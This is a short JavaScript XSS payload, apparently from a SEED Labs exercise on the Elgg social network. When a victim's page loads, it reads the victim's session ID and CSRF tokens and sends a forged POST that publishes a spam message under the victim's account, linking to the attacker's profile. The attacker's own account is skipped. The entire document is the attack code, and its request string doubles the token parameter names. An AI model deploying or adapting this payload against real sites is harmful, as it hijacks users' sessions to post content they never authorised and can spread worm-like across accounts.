<script type="text/javascript">
   

window.onload = function(){
    // JavaScript code to access user name, user guid, Time Stamp __elgg_ts
    // and Security Token __elgg_token
    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
    // Construct the content of your URL.
    var userGuid = elgg.session.user.guid;
    var bodyText = "To earn 12 USD/Hour(!), visit now\nhttp://www.seed-server.com/profile/samy";
    var sendurl = "http://www.seed-server.com/action/thewire/add";
    var content = "__elgg_token=" + token + "&__elgg_ts=" + ts + "&body=" + bodyText;

    if (userGuid != 59) {
         //console.log("Dhuksi if e");
        // Create and send Ajax request to modify profile
        var Ajax = null;
        Ajax = new XMLHttpRequest();
        Ajax.open("POST", sendurl, true);
        // Ajax.setRequestHeader("Host", "www.seed-server.com"); // Host is denied
        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax.send(content);
        //console.log("done");
    }
};


</script>